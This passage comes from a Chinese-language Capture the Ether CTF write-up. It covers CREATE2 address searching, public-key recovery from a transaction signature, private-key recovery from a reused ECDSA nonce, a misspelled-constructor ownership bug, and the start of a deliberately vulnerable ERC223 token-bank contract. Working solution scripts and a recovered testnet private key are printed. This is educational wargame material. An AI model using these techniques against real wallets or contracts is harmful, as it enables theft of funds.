&quot;</span>,</span><br><span class="line"><span class="attr">&quot;sourceMap&quot;</span>: <span class="string">&quot;107:239:0:-;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;107:239:0;;;;;;;&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>keccak256(0xff ++ deployingAddr ++ salt ++ keccak256(bytecode))[12:]计算攻击合约地址</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"><span class="comment"># CREATE2</span></span><br><span class="line"><span class="comment"># keccak256(0xff ++ deployingAddr ++ salt ++ keccak256(bytecode))[12:]</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_create2</span>(<span class="params">deployer, salt_hexstr, hashed_bytecode</span>):</span></span><br><span class="line">    addr_hexbytes = Web3.keccak(hexstr=(<span class="string">&#x27;ff&#x27;</span> + deployer + salt_hexstr +</span><br><span class="line">hashed_bytecode))</span><br><span class="line">    addr = Web3.toHex(addr_hexbytes)[<span class="number">-40</span>:]</span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line"><span class="comment"># expecting deployer=&#x27;aabbccdd&#x27; (20 bytes -&gt; 40 characters)</span></span><br><span class="line"><span class="comment"># salt = some decimal number</span></span><br><span class="line"><span class="comment"># bytecode = &#x27;aabbccddeeff...&#x27; (variable length)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create2</span>(<span class="params">deployer, salt, bytecode</span>):</span></span><br><span class="line">    <span class="keyword">assert</span>(len(deployer) == <span class="number">40</span>)</span><br><span class="line">    <span class="keyword">assert</span>(len(bytecode) % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">    salt_hexstr = hex(salt)[<span class="number">2</span>:].zfill(<span class="number">64</span>)</span><br><span class="line">    hashed_bytecode = Web3.toHex(Web3.keccak(hexstr=bytecode))[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">return</span> _create2(deployer, salt_hexstr, hashed_bytecode)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create2_search</span>(<span class="params">deployer, predicate, bytecode</span>):</span></span><br><span class="line">    salt = <span class="number">0</span></span><br><span class="line">    hashed_bytecode = Web3.toHex(Web3.keccak(hexstr=bytecode))[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        salt += <span class="number">1</span></span><br><span class="line">        salt_hexstr = hex(salt)[<span class="number">2</span>:].zfill(<span class="number">64</span>)</span><br><span class="line">        addr = _create2(deployer, salt_hexstr, hashed_bytecode)</span><br><span class="line">        <span class="keyword">if</span> salt % <span class="number">1000</span> == <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">&#x27;.&#x27;</span>, end=<span class="string">&#x27;&#x27;</span>, flush=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">if</span> predicate(addr):</span><br><span class="line">            print(<span class="string">f&quot;\nFound a match after <span class="subst">&#123;salt&#125;</span> attempts: <span class="subst">&#123;addr&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">4</span>:</span><br><span class="line">        print(<span class="string">f&quot;Usage: python3 <span class="subst">&#123;sys.argv[<span class="number">0</span>]&#125;</span> deployer_addr &lt;salt |predicate&gt; bytecode&quot;</span>)</span><br><span class="line">        print()</span><br><span class="line">        print(<span class="string">f&quot;When passing a salt value, this script prints theaddress of the newly deployed contract based on the deployer address andbytecode hash.&quot;</span>)</span><br><span class="line">        print(<span class="string">f&quot;Example: python3 <span class="subst">&#123;sys.argv[<span class="number">0</span>]&#125;</span>Bf6cE3350513EfDcC0d5bd5413F1dE53D0E4f9aE 42 602a60205260206020f3&quot;</span>)</span><br><span class="line">        print()</span><br><span class="line">        print(<span class="string">f&quot;When passing a predicate, this script will search for a salt value such that the new address satisfies the predicate.&quot;</span>)</span><br><span class="line">        print(<span class="string">f&quot;Example: python3 <span class="subst">&#123;sys.argv[<span class="number">0</span>]&#125;</span>Bf6cE3350513EfDcC0d5bd5413F1dE53D0E4f9aE &#x27;lambda addr: \&quot;badc0de\&quot; inaddr.lower()&#x27; 602a60205260206020f3&quot;</span>)</span><br><span class="line">        print(<span class="string">f&quot;Another predicate that may be useful: &#x27;lambda addr:addr.startswith(\&quot;0\&quot; * 8)&#x27; 602a60205260206020f3&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">        </span><br><span class="line">    deployer_addr = sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> deployer_addr.startswith(<span class="string">&#x27;0x&#x27;</span>):</span><br><span class="line">        deployer_addr = deployer_addr[<span class="number">2</span>:]</span><br><span class="line">    bytecode = sys.argv[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        salt = int(sys.argv[<span class="number">2</span>])</span><br><span class="line">        print(create2(deployer_addr, salt, bytecode))</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        predicate = eval(sys.argv[<span class="number">2</span>])</span><br><span class="line">        create2_search(deployer_addr, predicate, bytecode)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><pre><code>通过计算出来的合约攻击目标地址</code></pre><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-ffbd247b5cf6e84c2bda2bc3403eecd9-6e886e.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-ffbd247b5cf6e84c2bda2bc3403eecd9-6e886e.png"></a></p><h3 id="2-Public-Key"><a href="#2-Public-Key" class="headerlink" title="2. Public Key"></a>2. Public Key</h3><p><strong>题目描述：</strong></p><p>Recall that an address is the last 20 bytes of the keccak-256 hash of the address’s public key.</p><p>To complete this challenge, find the public key for the <code>owner</code>‘s account.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract PublicKeyChallenge &#123;</span><br><span class="line">    address owner &#x3D; 0x92b28647ae1f3264661f72fb2eb9625a89d88a31;</span><br><span class="line">    bool public isComplete;</span><br><span class="line"></span><br><span class="line">    function authenticate(bytes publicKey) public &#123;</span><br><span class="line">        require(address(keccak256(publicKey)) &#x3D;&#x3D; owner);</span><br><span class="line"></span><br><span class="line">        isComplete &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=Qp9JriLfH1w">Public Key Infrastructure</a>.</p><p><strong>解题：</strong></p><p>题目提供我们一个合约的地址，要求我们得到该地址的公钥。 这里涉及到以太坊的交易签名算法。当我们知道 r、s、v 和 hash时我们可以恢复出公钥。</p><p>R 、S、V 可以通过如下方法获得， 首先找到由这个账户发起的交易，然后通过脚本计算， 完整脚本如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> ethers = <span class="built_in">require</span>(<span class="string">&quot;ethers&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> Web3 = <span class="built_in">require</span>(<span class="string">&#x27;web3&#x27;</span>);</span><br><span class="line">(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="comment">// https://ropsten.etherscan.io/address/0x92b28647ae1f3264661f72fb2eb9625a89d88a31</span></span><br><span class="line">    <span class="comment">// https://ropsten.etherscan.io/getRawTx?tx=0xabc467bedd1d17462fcc7942d0af7874d6f8bdefee2b299c9168a216d3ff0edb</span></span><br><span class="line">    <span class="keyword">const</span> tx = ethers.utils.parseTransaction(<span class="string">&#x27;0xf87080843b9aca0083015f90946b477781b0e68031109f21887e6b5afeaaeb002b808c5468616e6b732c206d616e2129a0a5522718c0f95dde27f0827f55de836342ceda594d20458523dd71a539d52ad7a05710e64311d481764b5ae8ca691b05d14054782c7d489f3511a7abf2f5078962&#x27;</span>);</span><br><span class="line">    <span class="comment">// console.log(tx.r)</span></span><br><span class="line">    <span class="comment">// console.log(tx.s)</span></span><br><span class="line">    <span class="comment">// console.log(tx.v)</span></span><br><span class="line">      <span class="comment">// code to recover the public key from https://ethereum.stackexchange.com/questions/78815/ethers-js-recover-public-key-from-contract-deployment-via-v-r-s-values</span></span><br><span class="line">    <span class="keyword">const</span> expandedSig = &#123;</span><br><span class="line">        r: tx.r,</span><br><span class="line">        s: tx.s,</span><br><span class="line">        v: tx.v </span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">const</span> signature = ethers.utils.joinSignature(expandedSig);</span><br><span class="line">    <span class="keyword">const</span> txData = &#123;</span><br><span class="line">        gasPrice: tx.gasPrice,</span><br><span class="line">        gasLimit: tx.gasLimit,</span><br><span class="line">        value: tx.value,</span><br><span class="line">        nonce: tx.nonce,</span><br><span class="line">        data: tx.data,</span><br><span class="line">        chainId: tx.chainId,</span><br><span class="line">        to: tx.to <span class="comment">// you might need to include this if it&#x27;s a regular txand not simply a contract deployment</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">const</span> rsTx = <span class="keyword">await</span> ethers.utils.resolveProperties(txData);</span><br><span class="line">    <span class="keyword">const</span> raw = ethers.utils.serializeTransaction(rsTx); <span class="comment">// returns RLPencoded tx</span></span><br><span class="line">    <span class="keyword">const</span> msgHash = ethers.utils.keccak256(raw); <span class="comment">// as specified byECDSA</span></span><br><span class="line">    <span class="keyword">const</span> msgBytes = ethers.utils.arrayify(msgHash); <span class="comment">// create binaryhash</span></span><br><span class="line">    <span class="keyword">const</span> recoveredPubKey = ethers.utils.recoverPublicKey(msgBytes,signature);</span><br><span class="line">    <span class="comment">// recoveredPubKey is uncompressed, so starts with 0x04</span></span><br><span class="line">    <span class="keyword">const</span> compressedPubKey =</span><br><span class="line">ethers.utils.arrayify(recoveredPubKey).slice(<span class="number">1</span>);</span><br><span class="line">    <span class="comment">// console.log(compressedPubKey)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> answerPubKeyHex =</span><br><span class="line">Buffer.from(compressedPubKey).toString(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`0x<span class="subst">$&#123;answerPubKeyHex&#125;</span>`</span>);</span><br><span class="line">&#125;)();</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="number">0x613a8d23bd34f7e568ef4eb1f68058e77620e40079e88f705dfb258d7a06a1a0364dbe56cab53faf26137bec044efd0b07eec8703ba4a31c588d9d94c35c8db4</span></span><br></pre></td></tr></table></figure><p><strong>参考链接：</strong></p><p><a href="https://learnblockchain.cn/books/geth/part3/sign-and-valid.html">签名与校验 :: 以太坊技术与实现 (learnblockchain.cn)</a></p><h3 id="3-Account-Takeover"><a href="#3-Account-Takeover" class="headerlink" title="3. Account Takeover"></a>3. Account Takeover</h3><p><strong>题目描述：</strong></p><p>To complete this challenge, send a transaction from the <code>owner</code>‘s account.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract AccountTakeoverChallenge &#123;</span><br><span class="line">    address owner &#x3D; 0x6B477781b0e68031109f21887e6B5afEAaEB002b;</span><br><span class="line">    bool public isComplete;</span><br><span class="line"></span><br><span class="line">    function authenticate() public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; owner);</span><br><span class="line"></span><br><span class="line">        isComplete &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=GBkT19uH2RQ">Pinky and The Brain Intro</a>.</p><p><strong>解题：</strong></p><p>题目要求我们获取账户私钥</p><p>找到该账户的所有交易，发现有两笔交易使用了同样的 r</p><p>解题脚本如下：：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3, HTTPProvider</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> log</span><br><span class="line">infura_url = <span class="string">&#x27;https://ropsten.infura.io/v3/[api_key]&#x27;</span></span><br><span class="line">web3 = Web3(Web3.HTTPProvider(infura_url))</span><br><span class="line"></span><br><span class="line">a= web3.eth.get_transaction(<span class="string">&quot;0x061bf0b4b5fdb64ac475795e9bc5a3978f985919ce6747ce2cfbbcaccaf51009&quot;</span>)</span><br><span class="line">log.info(<span class="string">&quot;r = &#123;0&#125;&quot;</span>.format(a.r.hex()))</span><br><span class="line">log.info(<span class="string">&quot;s = &#123;0&#125;&quot;</span>.format(a.s.hex()))</span><br><span class="line">log.info(<span class="string">&quot;v= &#123;0&#125;&quot;</span>.format(a.v))</span><br><span class="line"></span><br><span class="line">a= web3.eth.get_transaction(<span class="string">&quot;0xd79fc80e7b787802602f3317b7fe67765c14a7d40c3e0dcb266e63657f881396&quot;</span>)</span><br><span class="line">log.info(<span class="string">&quot;r = &#123;0&#125;&quot;</span>.format(a.r.hex()))</span><br><span class="line">log.info(<span class="string">&quot;s = &#123;0&#125;&quot;</span>.format(a.s.hex()))</span><br><span class="line">log.info(<span class="string">&quot;v= &#123;0&#125;&quot;</span>.format(a.v))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = <span class="number">0x69a726edfb4b802cbf267d5fd1dabcea39d3d7b4bf62b9eeaeba387606167166</span></span><br><span class="line"><span class="comment"># txid:</span></span><br><span class="line"><span class="number">0xd79fc80e7b787802602f3317b7fe67765c14a7d40c3e0dcb266e63657f881396</span></span><br><span class="line">s2 = <span class="number">0x7724cedeb923f374bef4e05c97426a918123cc4fec7b07903839f12517e1b3c8</span></span><br><span class="line">z2 = <span class="number">0x350f3ee8007d817fbd7349c477507f923c4682b3e69bd1df5fbb93b39beb1e04</span></span><br><span class="line"><span class="comment"># txid:</span></span><br><span class="line"><span class="number">0x061bf0b4b5fdb64ac475795e9bc5a3978f985919ce6747ce2cfbbcaccaf51009</span></span><br><span class="line">s1 = <span class="number">0x2bbd9c2a6285c2b43e728b17bda36a81653dd5f4612a2e0aefdb48043c5108de</span></span><br><span class="line">z1 = <span class="number">0x4f6a8370a435a27724bbc163419042d71b6dcbeb61c060cc6816cda93f57860c</span></span><br><span class="line"><span class="comment"># prime order p</span></span><br><span class="line">p = <span class="number">0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141</span></span><br><span class="line"><span class="comment"># based on Fermat&#x27;s Little Theorem</span></span><br><span class="line"><span class="comment"># works only on prime n</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inverse_mod</span>(<span class="params">a, n</span>):</span></span><br><span class="line">    <span class="keyword">return</span> pow(a, n - <span class="number">2</span>, n)</span><br><span class="line"></span><br><span class="line">k=(z1-z2)*inverse_mod(s1-s2,p)%p               <span class="comment">#derivekfors1-s2</span></span><br><span class="line">pk = (s1 * k - z1) * inverse_mod(r, p) % p     <span class="comment"># derive private key </span></span><br><span class="line">pkNeg=(-s1*(-k%p)-z1)*inverse_mod(r,p)%p       <span class="comment">#-k(modp)of s1 - s2 == -s1 + s2, check -s1</span></span><br><span class="line">log.info(<span class="string">&#x27;k           = &#123;:x&#125;&#x27;</span>.format(k))</span><br><span class="line">log.info(<span class="string">&#x27;k negation  = &#123;:x&#125;&#x27;</span>.format(-k % p))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> pk == pkNeg:  <span class="comment"># should not be false</span></span><br><span class="line">    log.success(<span class="string">&#x27;private key = &#123;:x&#125;&#x27;</span>.format(pk))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">k=(z1-z2)*inverse_mod(s1+s2,p)%p <span class="comment">#derivekfors1+s2</span></span><br><span class="line">pk = (s1 * k - z1) * inverse_mod(r, p) % p <span class="comment"># derive private key pkNeg=(-s1*(-k%p)-z1)*inverse_mod(r,p)%p #-k(modp)of s1 + s2 == -s1 - s2, double check -s1</span></span><br><span class="line">log.info(<span class="string">&#x27;k           = &#123;:x&#125;&#x27;</span>.format(k))</span><br><span class="line">log.info(<span class="string">&#x27;k negation  = &#123;:x&#125;&#x27;</span>.format(-k % p))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> pk == pkNeg:  <span class="comment"># should not be false</span></span><br><span class="line">    log.success(<span class="string">&#x27;private key = &#123;:x&#125;&#x27;</span>.format(pk))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> eth_account <span class="keyword">import</span> Account</span><br><span class="line">acct =Account.from_key(<span class="string">&quot;614f5e36cd55ddab0947d1723693fef5456e5bee24738ba90bd33c0c6e68e269&quot;</span>)</span><br><span class="line">log.info(<span class="string">&#x27;account addr &#123;:x&#125;&#x27;</span>.format(acct.address))</span><br></pre></td></tr></table></figure><p>然后用这个账户调用 <code>authenticate</code> 函数即可：</p><p><strong>参考链接：</strong></p><p><a href="https://medium.com/coinmonks/smart-contract-exploits-part-3-featuring-capture-the-ether-accounts-c86d7e9a1400">Smart Contract Exploits Part 3 — Featuring Capture the Ether (Accounts) | by Enigmatic | Coinmonks | Medium</a></p><h2 id="Miscellaneous"><a href="#Miscellaneous" class="headerlink" title="Miscellaneous"></a>Miscellaneous</h2><h3 id="1-Assume-ownership"><a href="#1-Assume-ownership" class="headerlink" title="1. Assume ownership"></a>1. Assume ownership</h3><p><strong>题目描述：</strong></p><p>To complete this challenge, become the <code>owner</code>.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract AssumeOwnershipChallenge &#123;</span><br><span class="line">    address owner;</span><br><span class="line">    bool public isComplete;</span><br><span class="line"></span><br><span class="line">    function AssumeOwmershipChallenge() public &#123;</span><br><span class="line">        owner &#x3D; msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function authenticate() public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; owner);</span><br><span class="line"></span><br><span class="line">        isComplete &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=ytc4_JJWqMQ">Owner Of A Lonely Heart</a>.</p><p><strong>解题：</strong></p><p>构造函数存在拼写错误 , 导致合约部署的时候这个函数没有运行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AssumeOwnershipChallenge</span><br><span class="line">AssumeOwmershipChallenge</span><br></pre></td></tr></table></figure><p>因此我们可以直接调用 <code>AssumeOwmershipChallenge</code> 函数设置 owner</p><h3 id="2-Token-bank"><a href="#2-Token-bank" class="headerlink" title="2. Token bank"></a>2. Token bank</h3><p><strong>题目描述：</strong></p><p>I created a token bank. It allows anyone to deposit tokens by transferring them to the bank and then to withdraw those tokens later. It uses <a href="https://github.com/ethereum/EIPs/issues/223">ERC 223</a> to accept the incoming tokens.</p><p>The bank deploys a token called “Simple ERC223 Token” and assigns half the tokens to me and half to you. You win this challenge if you can empty the bank.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">interface ITokenReceiver &#123;</span><br><span class="line">    function tokenFallback(address from, uint256 value, bytes data) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SimpleERC223Token &#123;</span><br><span class="line">    &#x2F;&#x2F; Track how many tokens are owned by each address.</span><br><span class="line">    mapping (address &#x3D;&gt; uint256) public balanceOf;</span><br><span class="line"></span><br><span class="line">    string public name &#x3D; &quot;Simple ERC223 Token&quot;;</span><br><span class="line">    string public symbol &#x3D; &quot;SET&quot;;</span><br><span class="line">    uint8 public decimals &#x3D; 18;</span><br><span class="line"></span><br><span class="line">    uint256 public totalSupply &#x3D; 1000000 * (uint256(10) ** decimals);</span><br><span class="line"></span><br><span class="line">    event Transfer(address indexed from, address indexed to, uint256 value);</span><br><span class="line"></span><br><span class="line">    function SimpleERC223Token() public &#123;</span><br><span class="line">        balanceOf[msg.sender] &#x3D; totalSupply;</span><br><span class="line">        emit Transfer(address(0), msg.sender, totalSupply);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isContract(address _addr) private view returns (bool is_contract) &#123;</span><br><span class="line">        uint length;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            &#x2F;&#x2F;retrieve the size of the code on target address, this needs assembly</span><br><span class="line">            length :&#x3D; extcodesize(_addr)</span><br><span class="line">        &#125;</span><br><span class="line">        return length &gt; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address to, uint256 value) public returns (bool success) &#123;</span><br><span class="line">        bytes memory empty;</span><br><span class="line">        return transfer(to, value, empty);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address to, uint256 value, bytes data) public returns (bool) &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;&#x3D; value);</span><br><span class="line"></span><br><span class="line">        balanceOf[msg.sender] -&#x3D; value;</span><br><span class="line">        balanceOf[to] +&#x3D; value;</span><br><span class="line">        emit Transfer(msg.sender, to, value);</span><br><span class="line"></span><br><span class="line">        if (isContract(to)) &#123;</span><br><span class="line">            ITokenReceiver(to).tokenFallback(msg.sender, value, data);</span><br><span class="line">        &#125;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    event Approval(address indexed owner, address indexed spender, uint256 value);</span><br><span class="line"></span><br><span class="line">    mapping(address &#x3D;&gt; mapping(address &#x3D;&gt; uint256)) public allowance;</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint256 value)</span><br><span class="line">        public</span><br><span class="line">        returns (bool success)</span><br><span class="line">    &#123;</span><br><span class="line">        allowance[msg.sender][spender] &#x3D; value;</span><br><span class="line">        emit Approval(msg.sender, spender, value);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferFrom(address from, address to, uint256 value)</span><br><span class="line">        public</span><br><span class="line">        returns (bool success)</span><br><span class="line">    &#123;</span><br><span class="line">        require(value &lt;&#x3D; balanceOf[from]);</span><br><span class="line">        require(value &lt;&#x3D; allowance[from][msg.sender]);</span><br><span class="line"></span><br><span class="line">        balanceOf[from] -&#x3D; value;</span><br><span class="line">        balanceOf[to] +&#x3D; value;</span><br><span class="line">        